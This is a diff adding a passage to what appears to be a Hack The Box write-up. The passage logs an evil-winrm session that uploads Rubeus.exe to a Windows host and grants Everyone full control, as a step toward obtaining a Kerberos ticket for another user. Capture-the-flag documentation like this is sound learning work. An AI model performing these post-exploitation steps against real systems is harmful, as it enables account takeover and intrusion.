@@ -602,5 +602,17 @@ I dont have the credentials for `jaylee.clifton` as of yet, there is the option 
 # Uploading Rubeus to get a valid TGT as `jaylee.clifton`
 
 ```python
+evil-winrm-py PS C:\ProgramData> upload Rubeus.exe .
+Uploading /home/kali/htb/logging/Rubeus.exe: 512kB [00:01, 458kB/s]                                          
+[+] File uploaded successfully as: C:\ProgramData\Rubeus.exe
+
+evil-winrm-py PS C:\ProgramData> icacls "C:\ProgramData\Rubeus.exe" /grant Everyone:F
+processed file: C:\ProgramData\Rubeus.exe
+Successfully processed 1 files; Failed processing 0 files
+```
+
+Ill upload rubeus and grant all users full control over the file
+
+```python
 
 ```
